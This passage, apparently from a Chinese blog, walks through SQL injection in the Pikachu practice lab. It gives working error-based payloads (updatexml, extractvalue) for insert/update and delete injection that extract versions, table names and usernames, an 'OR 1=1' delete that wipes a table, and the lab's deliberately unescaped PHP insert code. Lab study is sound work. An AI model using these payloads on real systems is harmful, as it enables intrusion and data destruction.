class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 正常登录</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.132</span>:<span class="number">49154</span>/vul/sqli/sqli_iu/sqli_login.php?username=admin&amp;password=admin&amp;submit=Login</span><br><span class="line"></span><br><span class="line"># 试了下，注入不了，转战注册</span><br><span class="line">username=admin&amp;password=admin&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br><span class="line"></span><br><span class="line"># 赏密码一个单引号，又来了。</span><br><span class="line">username=admin&amp;password=<span class="comment">&#x27;&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"># 多个分号表示各个注册参数</span><br><span class="line"># 报错：You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27;&#x27;&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1</span></span><br><span class="line"></span><br><span class="line"># 赏账号一个单引号</span><br><span class="line">username=<span class="comment">&#x27;admin&amp;password=tumei&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"># 报错：You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;admin&#x27;,md5(&#x27;tumei&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1</span></span><br><span class="line"></span><br><span class="line"># 试下加#号</span><br><span class="line">username=admin&amp;password=<span class="comment">&#x27;#&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"># 报错：You have an <span class="keyword">error</span> in0 your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27; at line 1</span></span><br><span class="line"></span><br><span class="line"># 查看系统版本</span><br><span class="line">username=test<span class="comment">&#x27;  or updatexml(1,concat(0x7e,(select @@version),0x7e),0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"># 报错：XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~5.7.26-0ubuntu0.18.04.1-log~&#x27;</span></span><br><span class="line"></span><br><span class="line"># 查看数据库用户</span><br><span class="line">username=test<span class="comment">&#x27;  or updatexml(0,concat(0x7e,(select user()) ,0x7e)  ,0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"># 报错：XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~root@localhost~&#x27;</span></span><br><span class="line"></span><br><span class="line"># 拿当前数据库名</span><br><span class="line">username=test<span class="comment">&#x27;  or updatexml(1,concat(0x7e,database(),0x7e),0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"># 报错：XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~pikachu~&#x27;</span></span><br><span class="line"></span><br><span class="line"># 注册时使用到的数据表</span><br><span class="line">username=test<span class="comment">&#x27;  or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e),0) or &#x27;&amp;password=ada&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span></span><br><span class="line"># 报错：Truncated incorrect DOUBLE value: <span class="comment">&#x27;test&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 函数解析</span><br><span class="line"># UPDATEXML (XML_document, XPath_string, new_value);</span><br><span class="line"># 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line"># 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</span><br><span class="line"># 第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line"># 作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</span><br><span class="line"></span><br><span class="line"># 举例</span><br><span class="line"># 爆系统版本</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT @@version),<span class="number">0</span>x7e),<span class="number">1</span>)</span><br><span class="line"># concat()函数是mysql的字符串连接函数，使用时，<span class="number">16</span>进制也将自动转义，如<span class="number">0</span>x7e是 ~ 符号</span><br><span class="line"># 用concat+updatexml注入时，通常加上<span class="number">16</span>进制的连接符(如<span class="number">0</span>x7e)，使返回内容的完全显示</span><br><span class="line"># 因此不会符合XPATH_string的格式，从而出现格式错误，爆出</span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~5.7.26-0ubuntu0.18.04.1-log~&#x27;</span></span><br><span class="line"># 不加<span class="number">0</span>x7e试试，没问题呀，当个习惯吧，<span class="comment">&#x27;delete&#x27;注入中的解析讲有，制造不正确的路径</span></span><br><span class="line">updatexml(<span class="number">1</span>,concat((SELECT @@version)),<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"># 由于代码执行后没有回显，需要采用报错注入</span><br><span class="line"># xpath语法错误</span><br><span class="line"># 如下方法的返回值均为写入非法格式内容，其返回内容即为需要查询结果</span><br><span class="line"></span><br><span class="line"># extractvalue()	# 查询XML文档的函数</span><br><span class="line"># extractvalue(目标xml文档，xml路径)</span><br><span class="line"># extractvalue()能查询字符串的最大长度为<span class="number">32</span>；若超过，则使用substring()函数截取</span><br><span class="line"># 路径为‘/a’得到正常返回，为‘/a/’得到报错返回，如下</span><br><span class="line">select * from member where username=<span class="comment">&#x27;&#x27;  AND extractvalue(1,&#x27;/a/&#x27;);</span></span><br><span class="line"># 查询当前数据库</span><br><span class="line">select * from member where username=<span class="comment">&#x27;&#x27;  AND extractvalue(1,CONCAT(1,DATABASE()));</span></span><br><span class="line"># 查询pikachu数据库下所有表，其中使用substring()函数进行截取</span><br><span class="line">select * from member where username=<span class="comment">&#x27;&#x27;  AND extractvalue(1,concat(0x7e,(select subString(GROUP_CONCAT(table_name),1,8) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e));</span></span><br><span class="line"># 返回：XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~httpinfo~&#x27;</span></span><br><span class="line"># 截取后半部分未显示的表名</span><br><span class="line">select * from member where username=<span class="comment">&#x27;&#x27;  AND extractvalue(1,concat(0x7e,(select subString(GROUP_CONCAT(table_name),15,32) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e));</span></span><br><span class="line"># 返回：XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~r,message,users,xssblind~&#x27;</span></span><br><span class="line"></span><br><span class="line"># updatexml()			# 更新xml文档的函数</span><br><span class="line"># updatexml(目标xml文档，xml路径，更新的内容)</span><br><span class="line"># 正常使用</span><br><span class="line">select * from member where username=<span class="comment">&#x27;&#x27;  or updatexml(1,&#x27;/a&#x27;,&#x27;admin&#x27;);</span></span><br><span class="line"># updatexml(<span class="number">1</span>,<span class="comment">&#x27;/a&#x27;,&#x27;admin&#x27;) 返回true，若路径为‘/a/’将触发报错机制，如下为报错结果</span></span><br><span class="line"># XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;&#x27;</span></span><br><span class="line"># 写入<span class="comment">&#x27;  or updatexml(1,concat(0x7e,(select @@version),0x7e),0);</span></span><br><span class="line">select * from member where username=<span class="comment">&#x27;&#x27;  or updatexml(1,concat(0x7e,(select @@version),0x7e),0);</span></span><br><span class="line"># 报错返回:XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~5.7.26-0ubuntu0.18.04.1-log~&#x27;</span></span><br><span class="line"># 查询pikachu数据库下的所有表，其中使用了GROUP_CONCAT()多行显示问题(Subquery returns more than <span class="number">1</span> row)</span><br><span class="line">select * from member where username=<span class="comment">&#x27;&#x27;  or updatexml(1,concat(0x7e,(select GROUP_CONCAT(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),0x7e),0);</span></span><br><span class="line"># 返回结果：XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~httpinfo,member,message,users,x&#x27;</span></span><br><span class="line"># 对比数据库可知，返回结果的x全文应为xssblind，</span><br><span class="line"># 多次比对，结果显而易见</span><br><span class="line">select email from member where username=<span class="comment">&#x27;&#x27;  or updatexml(1,concat(0x7e,(select GROUP_CONCAT(username) FROM member),0x7e),1);</span></span><br><span class="line"># 通过SUBSTRING()方法获取后半部分，一次最多显示<span class="number">32</span>个字符，为保证lucy的完整性，从<span class="number">30</span>位开始</span><br><span class="line">select email from member where username=<span class="comment">&#x27;&#x27;  or updatexml(1,concat(0x7e,(select SUBSTRING(GROUP_CONCAT(username),30,32) FROM member),0x7e),1);</span></span><br><span class="line"># 结果：&gt; <span class="number">1105</span> - XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~lucy,lili,admin,admin,admin1,ro&#x27;</span></span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># <span class="keyword">exp</span>() 溢出报错注入</span><br><span class="line"># 该函数以e为底的指数函数，在参数大于<span class="number">709</span>时溢出报错</span><br><span class="line">select <span class="keyword">exp</span>(<span class="number">710</span>);</span><br><span class="line"># &gt; DOUBLE value is <span class="keyword">out</span> of range in <span class="comment">&#x27;exp(710)&#x27;</span></span><br><span class="line">select ~<span class="number">0</span>; # 将<span class="number">0</span>按位取反就会返回“<span class="number">18446744073709551615</span>”</span><br><span class="line">select ~(select version());	# 显示数据库版本，并将之按位取反得到“<span class="number">18446744073709551610</span>”</span><br><span class="line"># 子查询结合按位求反，造成DOUBLE overflow <span class="keyword">error</span>，并借由此注出数据。</span><br><span class="line"># 呃……这里有些懵，看其他师傅的解析也还是懵，后边再看吧</span><br><span class="line">select <span class="keyword">exp</span>(~(select * from(select database())x));</span><br><span class="line"># 报错：DOUBLE value is <span class="keyword">out</span> of range in <span class="comment">&#x27;exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))&#x27;</span></span><br><span class="line"># 好吧，当前版本mysql数据库（<span class="number">5.7</span>.<span class="number">26</span>-<span class="number">0</span>ubuntu0.<span class="number">18.04</span>.<span class="number">1</span>-<span class="keyword">log</span>）无法实现报错，<span class="number">5.5</span>.<span class="number">42</span>版本的<span class="keyword">EXP</span>() 函数可以实现报错注入</span><br><span class="line"># 发现一个报错显示当前数据库名的方法</span><br><span class="line">select * from a # &gt; <span class="number">1146</span> - Table <span class="comment">&#x27;pikachu.a&#x27; doesn&#x27;t exist       </span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录部分源码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># connect() 方法</span></span><br><span class="line"><span class="comment"># 打开一个非持久的 MySQL 连接</span></span><br><span class="line"><span class="comment"># 返回一个代表到 MySQL 服务器的连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># escape() 方法</span></span><br><span class="line"><span class="comment"># 该方法不会对 ASCII 字母和数字进行编码，也不会对一下 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</span></span><br><span class="line"><span class="comment"># 返回编码字符串，或者在失败时返回 FALSE。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execute() 方法</span></span><br><span class="line"><span class="comment"># 执行已经预处理过的语句，并且只是返回执行结果成功或失败</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysqli_num_rows() 函数</span></span><br><span class="line"><span class="comment"># 返回结果集中行的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysqli_fetch_assoc() 函数</span></span><br><span class="line"><span class="comment"># 从结果集中取得一行作为关联数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">//转义，防注入</span></span><br><span class="line">        <span class="variable">$username</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$password</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;select * from member where username=&#x27;<span class="subst">$username</span>&#x27; and pw=md5(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;sqli&#x27;</span>][<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$username</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;sqli&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]=<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:sqli_mem.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;登录失败,请重新登录&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册部分源码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># isset() 函数</span></span><br><span class="line"><span class="comment"># 用于检测变量是否已设置并且非 NULL。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysqli_affected_rows() 函数</span></span><br><span class="line"><span class="comment"># 返回前一次 MySQL 操作（SELECT、INSERT、UPDATE、REPLACE、DELETE）所影响的记录行数。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//      $getdata=escape($link, $_POST);//转义</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//没转义,导致注入漏洞,操作类型为insert</span></span><br><span class="line">        <span class="variable">$getdata</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;注册成功,请返回&lt;a href=&#x27;sqli_login.php&#x27;&gt;登录&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;注册失败,请检查下数据库是否还活着&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;必填项不能为空哦&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有链接可以看到，是通过id进行留言的删除</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">135.130</span>:<span class="number">49154</span>/vul/sqli/sqli_del.php?id=<span class="number">59</span></span><br><span class="line"></span><br><span class="line"># 引号测试报错</span><br><span class="line"># &gt; <span class="number">1064</span> - You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27;&#x27; at line 2</span></span><br><span class="line"></span><br><span class="line"># <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> 制造永真式删除 message 表中所有数据</span><br><span class="line"><span class="keyword">delete</span> from message where id=<span class="number">58</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"># 返回：&gt; Affected rows: <span class="number">2</span></span><br><span class="line"></span><br><span class="line"># 结合 updatexml 函数进行报错注入</span><br><span class="line"># <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select GROUP_CONCAT(username) FROM member),<span class="number">0</span>x7e),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">delete</span> from message where id=<span class="number">58</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select GROUP_CONCAT(username) FROM member),<span class="number">0</span>x7e),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"># 结合 extractvalue() 函数进行报错注入</span><br><span class="line"># <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES ),<span class="number">0</span>x7e)) 进行查所有数据库名操作</span><br><span class="line"><span class="keyword">delete</span> from message where id=<span class="number">58</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES ),<span class="number">0</span>x7e));</span><br><span class="line"># GROUP_CONCAT() 函数的最大允许结果长度（以字节为单位），默认值为<span class="number">1024</span>，超过直接报截断错误：&gt; <span class="number">1260</span> - Row <span class="number">54</span> was cut by GROUP_CONCAT()</span><br><span class="line">#使用 DISTINCT 关键字干掉重复值</span><br><span class="line"># DISTINCT 关键字与 SELECT 语句一起使用，来消除所有重复的记录，并只获取唯一一次记录，但效果似乎不是很好</span><br><span class="line"><span class="keyword">delete</span> from message where id=<span class="number">58</span> <span class="keyword">AND</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select GROUP_CONCAT(distinct TABLE_SCHEMA) FROM information_schema.TABLES),<span class="number">0</span>x7e))</span><br><span class="line"># 报错结果：&gt; <span class="number">1105</span> - XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~information_schema,mysql,perfor&#x27;</span></span><br><span class="line"># 使用 LIMIT 子句限制 SELECT 语句中查询的数据的数量，使用 OFFSET 子句设置偏移量（偏移量<span class="number">0</span>开始计算）</span><br><span class="line"><span class="keyword">delete</span> from message where id=<span class="number">58</span> <span class="keyword">AND</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select TABLE_SCHEMA FROM information_schema.TABLES LIMIT <span class="number">1</span> OFFSET <span class="number">205</span>),<span class="number">0</span>x7e))</span><br><span class="line"># 返回结果：&gt; <span class="number">1105</span> - XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~sys~&#x27;</span></span><br><span class="line"># 但有个问题，这个偏移量需要设置的有点多呀，还是需要用到 DISTINCT 关键字干掉重复值</span><br><span class="line"><span class="keyword">delete</span> from message where id=<span class="number">58</span> <span class="keyword">AND</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select DISTINCT TABLE_SCHEMA FROM information_schema.TABLES LIMIT <span class="number">1</span> OFFSET <span class="number">1</span>),<span class="number">0</span>x7e))</span><br><span class="line"># 简单解析下上面的 sql 语句</span><br><span class="line"># <span class="number">1</span>.通过 <span class="keyword">AND</span> 关键字实现多个语句的使用</span><br><span class="line"># <span class="number">2</span>.通过 extractvalue 函数进行报错，其返回结果位不正确的参数</span><br><span class="line"># <span class="number">3</span>.通过 concat 函数进行字符串的连接，主要为 extractvalue 函数提供不正确的参数（<span class="number">0</span>x7e的作用）</span><br><span class="line"># <span class="number">4</span>.通过 DISTINCT 关键字获取 TABLE_SCHEMA 字段所有记录的唯一值</span><br><span class="line"># <span class="number">5</span>.通过 LIMIT 关键字限制查找单条记录</span><br><span class="line"># <span class="number">6</span>.通过 OFFSEC 关键字设置偏移量，打破了<span class="number">1</span> row报错，实现查询整个表</span><br><span class="line">                    </span><br><span class="line"># 想起之前用到的 SUBSTRING 关键字，对字符串进行提取！每次查找获得一次，先说一下思路，使用 DISTINCT 关键字对查找字段进行去重，然后使用 GROUP_CONCAT 方法成组，当过长则使用 SUBSTRING 方法进行截取显示</span><br><span class="line">select GROUP_CONCAT( DISTINCT TABLE_SCHEMA) FROM information_schema.TABLES;</span><br><span class="line"># 现在的问题，前两步可以实现，但接入第三步只显示第一个数据库。？？可以了，好吧，多试试，可能是哪个字符写错了</span><br><span class="line">select SUBSTRING(GROUP_CONCAT( DISTINCT TABLE_SCHEMA),<span class="number">32</span>,<span class="number">32</span>) FROM information_schema.TABLES;</span><br><span class="line"># 当前题目的语句</span><br><span class="line"># 写入<span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select SUBSTRING(GROUP_CONCAT( DISTINCT TABLE_SCHEMA),<span class="number">32</span>,<span class="number">32</span>) FROM information_schema.TABLES),<span class="number">0</span>x7e))</span><br><span class="line"># 完整sql语句</span><br><span class="line"><span class="keyword">delete</span> from message where id=<span class="number">58</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select SUBSTRING(GROUP_CONCAT( DISTINCT TABLE_SCHEMA),<span class="number">32</span>,<span class="number">32</span>) FROM information_schema.TABLES),<span class="number">0</span>x7e),<span class="number">1</span>)</span><br><span class="line"># 报错结果：XPATH syntax <span class="keyword">error</span>: <span class="comment">&#x27;~mance_schema,pikachu,pkxss,sys~&#x27;         </span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 